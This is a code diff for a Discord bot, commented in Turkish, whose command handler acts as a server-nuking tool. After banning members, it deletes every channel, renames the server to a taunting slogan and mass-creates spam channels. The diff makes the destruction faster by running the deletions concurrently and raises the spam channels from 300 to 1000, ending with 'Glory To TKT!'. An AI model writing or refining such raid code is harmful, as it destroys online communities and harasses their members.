@@ -95,22 +95,21 @@ client.on('messageCreate', async (message) => {
       }
     }
 
-    // Tüm kanalları sil
-    for (const [channelId, channel] of message.guild.channels.cache) {
-      await channel.delete().catch(() => {});
-    }
+    // Tüm kanalları sil (eş zamanlı)
+    const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
+    await Promise.all(deletePromises);
 
     // Sunucu adını değiştir
     await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
 
-    // 300 yeni kanal oluştur (TKT💋, FORS💦, ALİLW💝, TKT💋 sırayla)
+    // 1000 yeni kanal oluştur (TKT💋, FORS💦, ALİLW💝, TKT💋 sırayla)
     const names = ['TKT💋', 'FORS💦', 'ALİLW💝', 'TKT💋'];
-    for (let i = 0; i < 300; i++) {
+    for (let i = 0; i < 1000; i++) {
       const name = names[i % names.length];
-      await message.guild.channels.create({ name: name }).catch(() => {});
+      message.guild.channels.create({ name: name }).catch(() => {});
     }
 
-    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi ve yeniden oluşturuldu. Glory To TKT!`);
+    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi ve yeniden oluşturuluyor. Glory To TKT!`);
   }
 });
 
